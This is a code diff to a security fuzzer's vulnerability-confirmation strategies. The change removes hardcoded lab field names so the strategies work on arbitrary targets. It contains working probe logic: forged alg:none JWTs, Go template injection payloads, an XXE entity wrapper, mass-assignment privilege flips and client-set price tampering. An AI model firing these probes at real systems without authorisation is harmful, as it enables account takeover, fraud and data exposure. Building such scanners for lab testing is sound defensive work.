@@ -966,40 +966,33 @@ class PriceIntegrityBypassStrategy(ConfirmationStrategy):
     recomputation op, proven live in
     `tests/test_labgen_price_integrity.py::test_live_boot_price_integrity_manifest_ignores_the_client_amount_on_the_secure_twin`.
 
-    **Canary has three decimal places**, structurally distinct from the real
-    rate table's own two-decimal-place values (`89.00`/`149.00`/`249.00` --
-    also excluded explicitly, defense in depth) -- a random two-decimal
-    canary could otherwise coincidentally collide with a real rate, caught
-    by this component's own pre-change adequacy review before implementation.
+    **Canary has three decimal places**, so it cannot coincide with an
+    ordinary two-decimal price the page already shows.
 
-    **Match is anchored**: `data-charged-amount="<canary>"` (after stripping
-    whitespace from the response body, mirroring the live-boot test's own
-    normalization) -- not a bare substring search, which could false-match
-    an unrelated field that happens to contain the same digits. **CC-FUZZ-0047**
-    (docs/LAB_BROWSABLE_APPS_STEP3_PLAN.md step 3): this was a
-    `"charged_amount":"<canary>"` JSON-fragment match until `LABGEN-BC-0005`/
-    `0006`'s checkout response converted from `response()->json(...)` to a
-    real HTML confirmation page; the anchor moved to that page's own
-    `data-charged-amount` attribute in the same change (`CC-LAB-0239`),
-    since a JSON-shaped match can never appear in HTML."""
+    **Match is anchored to a price context**, not a bare substring: the canary
+    must follow, within 40 characters, a currency symbol or a price word
+    (`_PRICE_CONTEXT`: the same words `R-PRICE-INTEGRITY` nominates on --
+    amount, price, total, cost, charge -- OWASP WSTG v4.2 WSTG-BUSL-01, and the
+    PortSwigger Web Security Academy lab "Excessive trust in client-side
+    controls", whose request carries `price`), and be digit-bounded. A plain
+    reflection of the value somewhere else on the page is not a charged
+    amount. (PA-0660, BUG-0661: until 2026-11-20 this matched one labgen
+    page's own attribute name and excluded that app's own rate table.)"""
     vuln_class = "price_integrity_bypass"
     mechanism = "trusted-client-amount-echo"
     category = "price-integrity-bypass"
 
-    #: The real rate-table literals this shape's secure twin can return --
-    #: excluded explicitly even though the canary's own decimal-place shape
-    #: already makes a collision structurally impossible (defense in depth).
-    _RATE_TABLE_AMOUNTS = frozenset({"89.00", "149.00", "249.00"})
+    #: A currency symbol or price word, then at most 40 characters, then the canary.
+    _PRICE_CONTEXT = r"(?:[$\u00a3\u20ac\u00a5]|amount|price|total|cost|charge)[^\n]{0,40}?"
 
     def confirm(self, candidate, sender):
-        while True:
-            whole = secrets.randbelow(9000) + 100
-            frac = secrets.randbelow(900) + 100
-            canary = f"{whole}.{frac}"
-            if canary not in self._RATE_TABLE_AMOUNTS:
-                break
+        whole = secrets.randbelow(9000) + 100
+        frac = secrets.randbelow(900) + 100
+        canary = f"{whole}.{frac}"
         text = (self._send(sender, candidate, canary).text or "").replace(" ", "")
-        if f'data-charged-amount="{canary}"' in text:
+        anchored = re.compile(self._PRICE_CONTEXT + r"(?<![\d.])" + re.escape(canary)
+                              + r"(?![\d])", re.IGNORECASE)
+        if anchored.search(text):
             return Verdict(True, self.vuln_class, self.mechanism,
                            {"payload": canary, "echoed": canary})
         return None
@@ -1147,18 +1140,14 @@ class GoTemplateSstiStrategy(ConfirmationStrategy):
     # Known limitation, not silently swept under the rug (the same per-target
     # field-name-hardcoding convention `PriceTrustDifferentialStrategy`'s/
     # `MassAssignmentPrivilegedFieldStrategy`'s own docstrings already use):
-    # for a JSON whole-body point (`content_type == "application/json"`), the
-    # template expression must be sent under this exact field name -- this
-    # project's own `go_net_http` `user_supplied_template_compile` sink shape
-    # (`{"template": "..."}"`, CC-LAB-0196). A differently-shaped JSON
-    # whole-body SSTI sink (a different field name) has nothing for this
-    # strategy to build, so it would send an unrecognized field and correctly
-    # fail closed rather than misfire -- it does not, and cannot, positively
-    # confirm the *absence* of this vulnerability class for a differently-
-    # shaped target, only decline to guess. A non-whole-body candidate (a
-    # plain named query/form param) needs no wrapping at all: the payload is
-    # sent as that param's raw value directly.
-    _JSON_FIELD = "template"
+    # A JSON whole-body point (`content_type == "application/json"`) carries the
+    # expression in every string leaf of the app's own captured body
+    # (`candidate.base_entries`, as `NoSqlOperatorStrategy` places its operators):
+    # the field the template is read from is the target's, never a name this
+    # strategy assumes (PA-0660, BUG-0661 -- until 2026-11-20 it sent one labgen
+    # sink's own field name). With no captured body there is nothing to place the
+    # expression in, so the strategy gives no verdict (a stated miss). A plain
+    # named query/form param needs no wrapping: the payload is its raw value.
 
     def _random_length(self) -> int:
         return secrets.randbelow(self._LEN_RANGE) + 100
@@ -1173,11 +1162,18 @@ class GoTemplateSstiStrategy(ConfirmationStrategy):
     def _expr(n: int, quote: str = '"') -> str:
         return "{{ len %s%s%s }}" % (quote, "A" * n, quote)
 
-    def _payload(self, candidate: Candidate, n: int, quote: str = '"') -> str:
+    def _payload(self, candidate: Candidate, n: int, quote: str = '"') -> str | None:
         expr = self._expr(n, quote)
         if candidate.content_type == "application/json":
-            import json
-            return json.dumps({self._JSON_FIELD: expr})
+            from fuzzlab.core import jsonbody
+            try:
+                base = jsonbody.normalize_entries(candidate.base_entries or ())
+                strings = [jsonbody.display_name(p) for p, v in base if isinstance(v, str)]
+                if not strings:
+                    return None
+                return jsonbody.body_with(base, {n_: expr for n_ in strings}).decode("utf-8")
+            except jsonbody.JsonPlacementError:
+                return None
         return expr
 
     @staticmethod
@@ -1203,6 +1199,8 @@ class GoTemplateSstiStrategy(ConfirmationStrategy):
         expr1, expr2 = self._expr(n1, delim), self._expr(n2, delim)
         payload1 = self._payload(candidate, n1, delim)
         payload2 = self._payload(candidate, n2, delim)
+        if payload1 is None or payload2 is None:
+            return None                            # nowhere to place it (no captured body)
         first = self._send(sender, candidate, payload1)
         text1 = _observed(first).text or ""
         second = self._send(sender, candidate, payload2)
@@ -1957,8 +1955,13 @@ class InsecureDeserializationTypeConfusionStrategy(ConfirmationStrategy):
 # modeled on) -- this strategy must never be extended to send anything other
 # than the injected `OobListener`'s own minted canary URL without a fresh,
 # dedicated safety review (`CLAUDE.md`'s lab-only/loopback-only posture).
+#: The entity is referenced in the root element's text: an external entity is
+#: fetched when the parser expands its reference, wherever it appears (W3C XML 1.0
+#: §4.4.3 "Included If Validating" / §4.4.2 "Included"; PortSwigger Web Security
+#: Academy, "XXE injection": `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "...">]>` then
+#: `&xxe;` in any text node). Until 2026-11-20 a first wrapper named one labgen
+#: app's own extracted element (PA-0660, BUG-0661).
 _XXE_ENTITY_WRAPPERS = [
-    "<r><title>&xxe;</title></r>",
     "<r>&xxe;</r>",
 ]
 
@@ -2062,13 +2065,15 @@ class JwtAlgNoneConfusionStrategy(ConfirmationStrategy):
     own -- see that strategy's own docstring for the same reasoning).
 
     Probe A: an unsigned token whose header claims `alg:none`, carrying a
-    freshly-minted per-run marker in its `channel_id` claim (the literal
-    field this project's own `CC-LAB-0180` sink echoes back --
-    `jwt_claims_response.go.j2` unmarshals only `channel_id`/`role`, so
-    the marker must travel in one of those two fields, not an arbitrary
-    one, to actually appear in the response). Confirms only if this
-    returns HTTP 200 with that exact marker echoed back -- proof the
-    target trusted the unsigned token's own forged claims.
+    freshly-minted per-run marker in the standard identity claims a
+    black-box tester can expect a server to read: RFC 7519 §4.1.2 `sub`
+    and OpenID Connect Core 1.0 §5.1 `name` / `preferred_username`
+    (`STANDARD_CLAIMS`; PA-0660, BUG-0661 -- until 2026-11-20 the marker
+    travelled in one labgen app's own claim name, which no black-box
+    target can be expected to read). Confirms only if this returns HTTP
+    200 with that exact marker echoed back -- proof the target trusted the
+    unsigned token's own forged claims. A target that reads only an
+    app-specific claim is a stated miss, not a guess.
 
     Probe B (the differentiator): the *same* marker, but claiming
     `alg:HS256` with a garbage signature. Must return a real auth-
@@ -2093,18 +2098,26 @@ class JwtAlgNoneConfusionStrategy(ConfirmationStrategy):
     mechanism = "alg-none-bypass"
     category = "jwt-algorithm-confusion"
 
+    #: Claims the marker travels in: RFC 7519 §4.1.2 (`sub`, the registered subject
+    #: claim) and OpenID Connect Core 1.0 §5.1 standard claims (`name`,
+    #: `preferred_username`). Never an app's own claim name (PA-0660).
+    STANDARD_CLAIMS = ("sub", "name", "preferred_username")
+
+    def _claims(self, token: str) -> dict:
+        return {claim: token for claim in self.STANDARD_CLAIMS}
+
     def confirm(self, candidate, sender):
         token = _token()
         alg_none_jwt = (
             _jwt_b64url({"alg": "none", "typ": "JWT"}) + "."
-            + _jwt_b64url({"channel_id": token, "role": "owner"}) + "."
+            + _jwt_b64url(self._claims(token)) + "."
         )
         probe_a = self._send(sender, candidate, f"Bearer {alg_none_jwt}")
         if probe_a.status != 200 or token not in (probe_a.text or ""):
             return None
         garbage_hs256_jwt = (
             _jwt_b64url({"alg": "HS256", "typ": "JWT"}) + "."
-            + _jwt_b64url({"channel_id": token, "role": "owner"}) + "."
+            + _jwt_b64url(self._claims(token)) + "."
             + "garbage-not-a-real-signature"
         )
         probe_b = self._send(sender, candidate, f"Bearer {garbage_hs256_jwt}")
@@ -2113,35 +2126,73 @@ class JwtAlgNoneConfusionStrategy(ConfirmationStrategy):
         return Verdict(True, self.vuln_class, self.mechanism, {"marker": token})
 
 
-def _session_token(text: str | None) -> str | None:
+#: Units per second a clock-derived token may count in: seconds, milliseconds,
+#: microseconds, nanoseconds (POSIX `time` / `clock_gettime`, JavaScript `Date.now`,
+#: Go `time.Now().UnixNano`, Java `System.currentTimeMillis` / `System.nanoTime`).
+_CLOCK_UNITS = (("s", 1), ("ms", 1_000), ("us", 1_000_000), ("ns", 1_000_000_000))
+#: An epoch reading lies within a day of this host's clock.
+_EPOCH_SLACK_S = 86_400
+#: The smallest step a nanosecond monotonic counter can show between two requests that
+#: each make a network round trip (10 us): a sequence counter stepping by 1 is no clock.
+_MONOTONIC_MIN_STEP_NS = 10_000
+
+
+def _decimal_leaves(text: str | None) -> dict[tuple, int]:
+    """Every JSON leaf of the response (any key path) whose value is an all-decimal
+    integer of 9 to 20 digits, keyed by its path. The key's name is never read
+    (PA-0660, BUG-0661)."""
     import json
+
+    from fuzzlab.core import jsonbody
     try:
-        return json.loads(text or "")["session_token"]
-    except (ValueError, TypeError, KeyError):
+        leaves = jsonbody.leaves(json.loads(text or ""))
+    except (ValueError, TypeError):
+        return {}
+    out: dict[tuple, int] = {}
+    for path, value in leaves or []:
+        if isinstance(value, bool):
+            continue
+        raw = str(value) if isinstance(value, (int, str)) else ""
+        if raw.isascii() and raw.isdigit() and 9 <= len(raw) <= 20:
+            out[path] = int(raw)
+    return out
+
+
+def _clock_reading(a: int, b: int, window_s: float, now: float) -> str | None:
+    """How ``a`` then ``b`` (one leaf, read by two requests sent within ``window_s``
+    seconds of this host's monotonic clock) read as a clock, or None: an epoch count
+    in some unit near ``now`` that moved by no more than the window, or a nanosecond
+    monotonic counter (Java `System.nanoTime`, CLOCK_MONOTONIC: no epoch origin) that
+    moved by at least one round trip and no more than the window. The window is an
+    upper bound by causality, never a jitter-sensitive estimate."""
+    delta = b - a
+    if delta < 0:
         return None
+    for name, per_s in _CLOCK_UNITS:
+        if abs(a / per_s - now) <= _EPOCH_SLACK_S and delta <= (window_s + 1) * per_s:
+            return f"epoch-{name}"
+    if _MONOTONIC_MIN_STEP_NS <= delta <= (window_s + 1) * 1_000_000_000:
+        return "monotonic-ns"
+    return None
 
 
 class PredictableTokenSourceStrategy(ConfirmationStrategy):
     """Confirms a predictable, timestamp-derived session token (CWE-330,
     this project's own `CC-LAB-0181` cell) with a two-probe differential:
-    send two ordinary probes, parse each response's own `session_token`
-    field, and confirm only if both parse as base-10 integers whose
-    difference is a small, non-negative number of nanoseconds.
-
-    **The primary false-positive defense is the parse gate, not the delta
-    bound**: a real `crypto/rand`-sourced hex token (this project's own
-    secure twin renders 64 lowercase hex characters) essentially never
-    parses as an all-decimal integer -- the probability every one of 64
-    independent hex digits happens to land in `{0-9}` rather than
-    `{a-f}` is `(10/16)**64 ~= 8.6e-14`, vanishingly small. The delta
-    bound (`_DELTA_CEILING_NS`) is a fixed, generous backstop
-    (10 seconds in nanoseconds -- several orders of magnitude above the
-    ~1ms deltas this project's own real live-boot test observes between
-    two ordinary sequential probes), not a precise measurement of actual
-    elapsed wall-clock time: a fixed ceiling is immune to test-
-    infrastructure jitter (a loaded CI runner, network latency to a real
-    target) in a way that trying to bound the delta to a *measured*
-    elapsed-time window would not be.
+    send two ordinary probes, read every JSON leaf of each response whose value
+    is an all-decimal integer, and confirm only if one key path reads as a
+    clock in both (`_clock_reading`): an epoch count in seconds, milliseconds,
+    microseconds or nanoseconds near this host's time that moved by no more
+    than the measured window around the two sends (plus 1 s), or a nanosecond
+    monotonic counter with no epoch origin that moved by at least one round
+    trip and no more than that window. The key's name is never read (PA-0660,
+    BUG-0661: until 2026-11-20 the strategy read one labgen app's own response
+    key). The window is measured on this host's monotonic clock from before
+    the first send to after the second answer, so it bounds the server's two
+    readings by causality; jitter only widens it. A random token (hex, or a
+    random decimal) essentially never lands in that window; a sequence counter
+    stepping by 1 is below the monotonic minimum step and is not near the
+    epoch, so it is not a clock either.
 
     Known limitation, not silently swept under the rug: `Verdict.evidence`
     deliberately does not record the full raw token values (unlike this
@@ -2155,127 +2206,93 @@ class PredictableTokenSourceStrategy(ConfirmationStrategy):
     mechanism = "timestamp-derived-token"
     category = "weak-token-entropy"
 
-    _DELTA_CEILING_NS = 10_000_000_000   # 10s -- a fixed backstop, not a
-                                          # measured-elapsed-time bound
-
     def confirm(self, candidate, sender):
+        import time
+
+        start = time.monotonic()
         probe_a = self._send(sender, candidate, "{}")
         probe_b = self._send(sender, candidate, "{}")
-        token_a = _session_token(probe_a.text)
-        token_b = _session_token(probe_b.text)
-        if token_a is None or token_b is None:
-            return None
-        try:
-            delta = int(token_b) - int(token_a)
-        except (ValueError, TypeError):
-            return None
-        if not (0 <= delta <= self._DELTA_CEILING_NS):
-            return None
-        return Verdict(True, self.vuln_class, self.mechanism,
-                       {"token_a_prefix": str(token_a)[:8],
-                        "token_b_prefix": str(token_b)[:8],
-                        "delta_ns": delta})
-
-
-def _json_bool_field(text: str | None, field: str) -> bool | None:
-    import json
-    try:
-        val = json.loads(text or "")[field]
-    except (ValueError, TypeError, KeyError):
+        window = time.monotonic() - start
+        now = time.time()
+        values_a = _decimal_leaves(probe_a.text)
+        values_b = _decimal_leaves(probe_b.text)
+        for path, token_a in values_a.items():
+            token_b = values_b.get(path)
+            if token_b is None:
+                continue
+            clock = _clock_reading(token_a, token_b, window, now)
+            if clock is not None:
+                return Verdict(True, self.vuln_class, self.mechanism,
+                               {"token_a_prefix": str(token_a)[:8],
+                                "token_b_prefix": str(token_b)[:8],
+                                "clock": clock, "delta": token_b - token_a})
         return None
-    return val if isinstance(val, bool) else None
 
 
 class MassAssignmentPrivilegedFieldStrategy(ConfirmationStrategy):
-    """Confirms unrestricted mass assignment (CWE-915, this project's own
-    `CC-LAB-0182` cell) with a two-probe differential over a privileged,
-    never-user-facing JSON body field (`is_partner`, this project's own
-    Go/Twitch lab's fixed shape -- the same "hardcode the sink's own
-    known field name in the strategy" convention
-    `PredictableTokenSourceStrategy`'s `session_token` and
-    `JwtAlgNoneConfusionStrategy`'s `channel_id`/`role` claims already
-    use), mirroring those two strategies' own "a bare single-probe 200
-    is not enough evidence" reasoning -- this project's first-ever
-    rule/strategy pair for the `mass_assignment` class (already built on
-    three other stacks' lab pages, `php_current`/`ruby_rails`/
-    `php_laravel`, but with no detection anywhere in the project until
-    this strategy).
+    """Confirms unrestricted mass assignment (CWE-915; OWASP API Security Top 10
+    2023 API3 "Broken Object Property Level Authorization"; OWASP Mass
+    Assignment Cheat Sheet) on a JSON whole-body point, from the target's own
+    response alone (PA-0660, BUG-0661: until 2026-11-20 this strategy sent one
+    labgen app's own field names, which no black-box target can be expected to
+    have).
 
-    Ground truth uses the whole-body-point convention
-    (`param="body"`/`location="body"`) this project already uses for
-    other no-single-named-field whole-body cases (`weak_token_entropy`'s
-    own `TWCH-0005`) rather than naming the privileged field in `param`
-    directly (the way `ruby_rails`'s own `FCART-0004` does with
-    `user[role]`): `fuzzlab.harness.auto.points_from_ground_truth` only
-    marks a point's body as JSON (`content_type="application/json"`)
-    when `param == "body"` exactly -- a real, deliberately narrow gate
-    that a first draft of this strategy's own ground truth got wrong
-    (`param="is_partner"`), caught by actually running the point through
-    the real `run_targets` pipeline rather than trusting the unit tests'
-    own fake-sender candidates alone.
+    Probe A sends an empty JSON object. Requires HTTP 200 and a JSON object
+    response; the record's own top-level boolean properties reading `false`
+    that the request did not send are the candidates (the server reports them
+    on its own, so the client was never asked for them).
 
-    Probe A sends only the fields this endpoint's own intended form
-    exposes (`display_name`/`bio`) plus a freshly-minted per-run marker
-    in `display_name`. Requires HTTP 200 with the marker echoed back and
-    the privileged field reading back `false` -- establishes the
-    baseline the endpoint starts from, so a target that always reports
-    the privileged field as `true` regardless of input can never
-    false-positive here.
+    Probe B sends each candidate property set to `true`. Probe C, the control,
+    sends one never-existing property (`zq<hex>`) set to `true`. Confirms only
+    if probe B is HTTP 200 and at least one candidate now reads `true`, while
+    probe C's property does not come back -- so an endpoint that merely
+    reflects whatever JSON it is sent is never mistaken for one that binds the
+    request into its record.
 
-    Probe B (the differentiator) sends the *same* marker and intended
-    fields, plus `is_partner: true` in the same JSON body. Confirms only
-    if this probe is also HTTP 200, still echoes the marker, and the
-    privileged field now reads back `true` -- proof that this specific,
-    never-exposed field is what changed, not merely "some field changed"
-    or "the endpoint always reports true".
-
-    Known limitation, not silently swept under the rug: this assumes the
-    candidate is a JSON whole-body point (`content_type ==
-    "application/json"`) whose response echoes the updated record as a
-    flat JSON object with a literal `is_partner` top-level boolean key --
-    this project's own Go/Twitch lab's exact response shape. A
-    differently-shaped mass-assignment endpoint (e.g. `ruby_rails`'s own
-    `FCART-0004`, a form-encoded nested `user[role]` param with no JSON
-    response echo and a different privileged field name entirely) has
-    nothing for this strategy to parse or match, so it fails closed
-    (returns `None`) rather than misfiring -- it does not, and cannot,
-    positively confirm the *absence* of mass assignment for a
-    differently-shaped target, only decline to guess.
+    Stated limits: a target whose privileged property is not a top-level
+    boolean the response reports, or that answers an empty object with an
+    error, gives no verdict (a miss, never a guess). A boolean the app's own
+    client legitimately sets (a preference) is indistinguishable here from a
+    privileged one: the evidence names the property so a reviewer can judge it.
     """
     vuln_class = "mass_assignment"
     mechanism = "privileged-field-injection"
     category = "mass-assignment"
 
-    _PRIVILEGED_FIELD = "is_partner"
-    _INTENDED_FIELDS = {"bio": "lab-probe"}
+    @staticmethod
+    def _object(text: str | None) -> dict | None:
+        import json
+        try:
+            value = json.loads(text or "")
+        except (ValueError, TypeError):
+            return None
+        return value if isinstance(value, dict) else None
 
     def confirm(self, candidate, sender):
         import json
 
         if candidate.content_type != "application/json":
             return None    # only a declared-JSON whole-body point can carry this format
-        marker = _token()
-
-        baseline_body = json.dumps({"display_name": marker, **self._INTENDED_FIELDS})
-        probe_a = self._send(sender, candidate, baseline_body)
-        if probe_a.status != 200 or marker not in (probe_a.text or ""):
+        probe_a = self._send(sender, candidate, "{}")
+        record = self._object(probe_a.text) if probe_a.status == 200 else None
+        if not record:
             return None
-        before = _json_bool_field(probe_a.text, self._PRIVILEGED_FIELD)
-        if before is not False:
-            return None    # either unparseable or already true -- no clean baseline
-
-        probe_body = json.dumps(
-            {"display_name": marker, self._PRIVILEGED_FIELD: True, **self._INTENDED_FIELDS}
-        )
-        probe_b = self._send(sender, candidate, probe_body)
-        if probe_b.status != 200 or marker not in (probe_b.text or ""):
+        unsent = [k for k, v in record.items() if v is False]
+        if not unsent:
+            return None    # no property the server reports on its own to try
+        probe_b = self._send(sender, candidate, json.dumps({k: True for k in unsent}))
+        after = self._object(probe_b.text) if probe_b.status == 200 else None
+        if not after:
             return None
-        after = _json_bool_field(probe_b.text, self._PRIVILEGED_FIELD)
-        if after is not True:
-            return None    # the privileged field never actually changed
-
+        flipped = [k for k in unsent if after.get(k) is True]
+        if not flipped:
+            return None    # nothing the request set was bound into the record
+        control = "zq" + _token()
+        probe_c = self._send(sender, candidate, json.dumps({control: True}))
+        if control in (probe_c.text or ""):
+            return None    # the endpoint reflects any property: no binding evidence
         return Verdict(True, self.vuln_class, self.mechanism,
-                       {"field": self._PRIVILEGED_FIELD, "marker": marker})
+                       {"field": flipped[0], "fields": flipped})
 
 
 # --- unrestricted file upload (CWE-434, this project's `CC-LAB-0186` cell) --
@@ -2702,118 +2719,75 @@ class StoredXssStrategy(_BrowserXssStrategy):
         return self._executor.run(ExecRequest(url=candidate.url, store=store), token)
 
 
-def _json_number_field(text: str | None, field: str) -> float | int | None:
-    """Like `_json_bool_field`, but for a numeric field -- used by
-    `PriceTrustDifferentialStrategy` to read back the reflected `monthly_charge`.
-    Returns `None` (never `0`/`False`-as-falsy) on anything unparseable, a
-    missing key, or a non-numeric value (a `bool` is explicitly excluded,
-    since Python's `bool` is a `int` subclass and would otherwise silently
-    pass this check)."""
-    import json
-    try:
-        val = json.loads(text or "")[field]
-    except (ValueError, TypeError, KeyError):
-        return None
-    if isinstance(val, bool) or not isinstance(val, (int, float)):
-        return None
-    return val
-
-
 class PriceTrustDifferentialStrategy(ConfirmationStrategy):
-    """Confirms `price_integrity_bypass` (CWE-807, this project's own
-    `CC-LAB-0188` cell -- Netflix's `/api/subscription/change-plan`) with a
-    two-probe differential over the JSON body's own `monthly_charge` field
-    (this project's own Go/Twitch-lab-style "hardcode the sink's own known
-    field name in the strategy" convention `MassAssignmentPrivilegedField
-    Strategy`'s `is_partner` and `JwtAlgNoneConfusionStrategy`'s
-    `channel_id`/`role` claims already use) -- this project's first-ever
-    rule/strategy pair for the `price_integrity_bypass` class at all (a
-    real implementation already exists on two stacks, `php_laravel`'s
-    Booking.com checkout charge, `CC-LAB-0212`, and `spring_boot`'s own
-    Netflix plan-change endpoint, `CC-LAB-0188`, but neither had any
-    detection capability before this entry).
+    """Confirms `price_integrity_bypass` (CWE-807; OWASP WSTG v4.2 WSTG-BUSL-01;
+    PortSwigger Web Security Academy "Excessive trust in client-side controls")
+    with a two-probe differential over the numeric leaves of the app's own
+    captured JSON body (`candidate.base_entries`), never over a field name the
+    strategy assumes (PA-0660, BUG-0661: until 2026-11-20 it sent one labgen
+    endpoint's own field and tier names).
 
-    Unlike a strategy that would need to know the target's own real price
-    in advance (which a genuine black-box fuzzer never does), this
-    strategy needs no such prior knowledge: it sends the *same* plan_tier
-    twice with two deliberately different, attacker-chosen amounts, and
-    checks whether the amount that comes back tracks whichever amount was
-    just sent (client-trusted, vulnerable) or stays identical across both
-    requests despite the different inputs (server-recomputed, secure) --
-    the same "does the sink's own output move with this specific input"
-    reasoning `MassAssignmentPrivilegedFieldStrategy`'s own two-probe
-    differential already uses for a boolean field, generalized here to a
-    numeric one.
+    For each numeric leaf of the captured body: probe A sends the body with that
+    leaf set to an implausibly low amount (`0.01`), probe B with an implausibly
+    high one (`999999.99`). Confirms only if both are HTTP 200 and the response's
+    JSON leaf at the same path reads back exactly what each probe sent -- the
+    server's amount tracks the client's, not merely "some number came back".
 
-    Probe A sends `{"plan_tier": "standard", "monthly_charge": 0.01}` --
-    an implausibly low amount no real Standard-tier price would ever be.
-    Requires HTTP 200 and a numeric `monthly_charge` in the response;
-    establishes this run's own baseline reading, whatever it is (this
-    strategy never assumes it knows the real price).
-
-    Probe B (the differentiator) sends the same plan_tier with a
-    different, implausibly high amount
-    (`{"plan_tier": "standard", "monthly_charge": 999999.99}`). Confirms
-    only if this probe is also HTTP 200 with a numeric `monthly_charge`,
-    AND probe A's reading equals its own submitted `0.01` AND probe B's
-    reading equals its own submitted `999999.99` -- proof that the
-    server's own charge tracks whatever the client sends, not merely that
-    "some number came back" or "the two probes differ for any reason".
-    A target whose reading is identical across both probes (the secure,
-    server-recomputed shape -- the real charge for a fixed plan_tier
-    never changes) fails closed, correctly, rather than being treated as
-    weak/ambiguous evidence.
-
-    Known limitation, not silently swept under the rug: this assumes the
-    candidate is a JSON whole-body point (`content_type ==
-    "application/json"`) whose response echoes a flat, top-level numeric
-    `monthly_charge` key, and that `plan_tier="standard"` is an accepted
-    tier -- this project's own Netflix/`spring_boot` lab's exact shape
-    (and `php_laravel`'s Booking.com twin's own JSON response shape,
-    which also echoes a flat top-level charge, though under a different
-    field name this strategy does not attempt to also match, per this
-    project's existing per-target field-name-hardcoding convention). A
-    differently-shaped price-integrity endpoint (a different field name,
-    a non-JSON response, or a DB-row read-back instead of a JSON echo,
-    the way `CC-LAB-0212`'s own DB-insert live-boot proof reads the
-    charge back) has nothing for this strategy to parse or match, so it
-    fails closed (returns `None`) rather than misfiring -- it does not,
-    and cannot, positively confirm the *absence* of price-integrity
-    bypass for a differently-shaped target, only decline to guess.
+    Stated limits: with no captured JSON body (a point the answer key named but
+    no crawl captured), or a response that does not echo the amount at the
+    request's own path, there is no verdict (a miss, never a guess). At most
+    `MAX_LEAVES` numeric leaves are tried.
     """
     vuln_class = "price_integrity_bypass"
     mechanism = "client-price-trust-differential"
     category = "price-integrity-bypass"
 
-    _FIELD = "monthly_charge"
-    _TIER = "standard"
     _LOW_AMOUNT = 0.01
     _HIGH_AMOUNT = 999999.99
+    MAX_LEAVES = 4
 
-    def confirm(self, candidate, sender):
+    @staticmethod
+    def _reading(text: str | None, path: tuple):
         import json
 
-        if candidate.content_type != "application/json":
-            return None    # only a declared-JSON whole-body point can carry this format
-
-        body_a = json.dumps({"plan_tier": self._TIER, self._FIELD: self._LOW_AMOUNT})
-        probe_a = self._send(sender, candidate, body_a)
-        if probe_a.status != 200:
+        from fuzzlab.core import jsonbody
+        try:
+            leaves = jsonbody.leaves(json.loads(text or ""))
+        except (ValueError, TypeError):
             return None
-        reading_a = _json_number_field(probe_a.text, self._FIELD)
-        if reading_a is None or reading_a != self._LOW_AMOUNT:
-            return None    # unparseable, or already doesn't track the low probe
+        for p, v in leaves or []:
+            if p == path and isinstance(v, (int, float)) and not isinstance(v, bool):
+                return v
+        return None
 
-        body_b = json.dumps({"plan_tier": self._TIER, self._FIELD: self._HIGH_AMOUNT})
-        probe_b = self._send(sender, candidate, body_b)
-        if probe_b.status != 200:
+    def confirm(self, candidate, sender):
+        from fuzzlab.core import jsonbody
+
+        if candidate.content_type != "application/json" or not candidate.base_entries:
             return None
-        reading_b = _json_number_field(probe_b.text, self._FIELD)
-        if reading_b is None or reading_b != self._HIGH_AMOUNT:
-            return None    # the charge never actually tracked the high probe either
-
-        return Verdict(True, self.vuln_class, self.mechanism,
-                       {"field": self._FIELD, "low": reading_a, "high": reading_b})
+        try:
+            base = jsonbody.normalize_entries(candidate.base_entries)
+        except jsonbody.JsonPlacementError:
+            return None
+        numeric = [p for p, v in base
+                   if isinstance(v, (int, float)) and not isinstance(v, bool)]
+        for path in numeric[:self.MAX_LEAVES]:
+            name = jsonbody.display_name(path)
+            readings = []
+            for amount in (self._LOW_AMOUNT, self._HIGH_AMOUNT):
+                try:
+                    body = jsonbody.body_with(base, {name: amount}).decode("utf-8")
+                except jsonbody.JsonPlacementError:
+                    break
+                probe = self._send(sender, candidate, body)
+                reading = self._reading(probe.text, path) if probe.status == 200 else None
+                if reading != amount:
+                    break
+                readings.append(reading)
+            if len(readings) == 2:
+                return Verdict(True, self.vuln_class, self.mechanism,
+                               {"field": name, "low": readings[0], "high": readings[1]})
+        return None
 
 
 class HttpHeaderInjectionCrlfStrategy(ConfirmationStrategy):
